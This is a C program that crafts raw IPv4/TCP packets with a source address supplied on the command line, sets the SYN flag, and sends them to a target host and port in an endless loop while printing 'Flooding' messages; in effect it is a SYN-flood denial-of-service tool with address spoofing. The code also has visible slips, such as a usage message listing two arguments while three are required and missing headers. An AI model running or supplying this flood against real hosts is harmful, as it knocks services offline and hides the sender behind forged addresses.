
#include	<sys/socket.h>	/* basic socket definitions */
#include	<netinet/in.h>	/* sockaddr_in{} and other Internet defns */
#include	<stdio.h>
#include	<arpa/inet.h>
#include 	<unistd.h>
#include	<netinet/tcp.h>
#include	<netinet/ip.h>

	struct ipheader {
     unsigned char      iph_ihl:4, /* Little-endian */
                        iph_ver:4;
     unsigned char      iph_tos;
     unsigned short int iph_len;
     unsigned short int iph_ident;
     unsigned short int iph_offset;
     unsigned char      iph_ttl;
     unsigned char      iph_protocol;
     unsigned short int iph_chksum;
     unsigned int       iph_sourceip;
     unsigned int       iph_destip;
    };

    /* Structure of the TCP header */
    struct tcpheader {
     unsigned short int   tcph_srcport;
     unsigned short int   tcph_destport;
     unsigned int             tcph_seqnum;
     unsigned int             tcph_acknum;
     unsigned short int
	   	   tcph_ns:1,
           tcph_reser:3,     /*reserved 3 bits*/
		   tcph_hlen:4,      /*length of tcp header in 32-bit words*/
           tcph_fin:1,
           tcph_syn:1,
           tcph_rst:1,
           tcph_psh:1,
           tcph_ack:1,
		   tcph_urg:1,
		   tcph_ece:1,
		   tcph_cwr:1;
     unsigned short int   tcph_win;
     unsigned short int   tcph_chksum;
     unsigned short int   tcph_urgptr;
    };

unsigned short caculateCheckSum(unsigned short *buf, int numwords)
{
	unsigned long sum;
	for (sum=0;numwords>0;numwords=numwords-2)
		sum=sum+*buf++; //calculate the sum of each 16 bit value within the header except the checksum
	sum=(sum & 0xffff)+(sum>>16);
	sum +=(sum>>16);
	return (unsigned short)(~sum);

}

unsigned short csum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}
/*
    96 bit (12 bytes) pseudo header needed for tcp header checksum calculation
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};


int main(int argc, char *argv[])
{
	int	sockfd;
	if((sockfd = socket(PF_INET,SOCK_RAW,IPPROTO_TCP)) < 0)
			printf("create socket error\n");
	char datagram[1024],*pseudogram;

	struct ipheader *iph=datagram;
	struct tcpheader *tcph=datagram + sizeof(struct ipheader);
	struct sockaddr_in sin;

	if(argc != 4)
	{
		printf("Invalid parameters!\n");
		printf("Usage: %s <dest ip address> <dest ip port> \n",argv[0]);
		exit(-1);
	}

	unsigned int destIP_Port=atoi(argv[3]);

	sin.sin_family=AF_INET;
	sin.sin_port=htons(destIP_Port); //convert from host byte order to network byte order
	sin.sin_addr.s_addr=inet_addr(argv[2]);

	memset(datagram,0,1024);
	iph->iph_ihl=5;
	iph->iph_ver=4;
	iph->iph_tos=0;
	iph->iph_len=sizeof(struct ipheader)+sizeof(struct tcpheader);
	iph->iph_ident = htons(54321);
	iph->iph_offset=0;
	iph->iph_ttl=255;
	iph->iph_protocol=6; //tcp layer
	iph->iph_chksum=0;

	iph->iph_sourceip = inet_addr (argv[1]);
	iph->iph_destip = sin.sin_addr.s_addr;
	tcph->tcph_srcport = htons (5678);
	tcph->tcph_destport = htons (destIP_Port);
	tcph->tcph_seqnum = (int) 0;
	tcph->tcph_acknum = (int) 0;
	tcph->tcph_hlen=5;
	tcph->tcph_reser=0;
	tcph->tcph_ns=0;
	tcph->tcph_fin=0;
	tcph->tcph_ece=0;
	tcph->tcph_rst=0;
	tcph->tcph_psh=0;
	tcph->tcph_ack=0;
	tcph->tcph_urg=0;
	tcph->tcph_syn=1;
	tcph->tcph_cwr=0;
	tcph->tcph_win=htons(65535);
	tcph->tcph_chksum=0;
	tcph->tcph_urgptr=0;
	iph->iph_chksum = caculateCheckSum((unsigned short *) datagram, iph->iph_len);
	printf("ipchecksum: %d\n",iph->iph_chksum);

	//Now the TCP checksum
	 struct pseudo_header psh;
	 psh.source_address = inet_addr( argv[1] );
	 psh.dest_address = sin.sin_addr.s_addr;
	 psh.placeholder = 0;
	 psh.protocol = IPPROTO_TCP;
	 psh.tcp_length = htons(sizeof(struct tcpheader));

	 int psize = sizeof(struct pseudo_header) + sizeof(struct tcpheader);
	 pseudogram = malloc(psize);

	 memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	 memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcpheader));

	 tcph->tcph_chksum = caculateCheckSum( (unsigned short*) pseudogram , psize);
	 printf("tcpchecksum: %d\n",tcph->tcph_chksum);
	 printf("tcp calculated : %d\n",caculateCheckSum((unsigned short*) pseudogram,psize) );

	int tmp = 1;

	const int *val = &tmp;

	if(setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
	{

	printf("Error: setsockopt() - Cannot set HDRINCL!\n");

	/* If something wrong, just exit */

	exit(-1);

	}

	else

	  printf("OK, using your own header!\n");



    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 1;

    if (setsockopt (sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
                sizeof(timeout)) < 0)
    	printf("setsockopt failed\n");

    if (setsockopt (sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,
                sizeof(timeout)) < 0)
    	printf("setsockopt failed\n");



	/* You have to manually stop this program */
	
	while(1)

	{

	  if(sendto(sockfd,datagram,iph->iph_len,0,(struct sockaddr *) &sin,sizeof (sin)) < 0)
		  printf("sendto() error!!!.\n");
	  else
	      printf("Flooding %s at %u...\n", argv[2], destIP_Port);

	}
	  return 0;

}

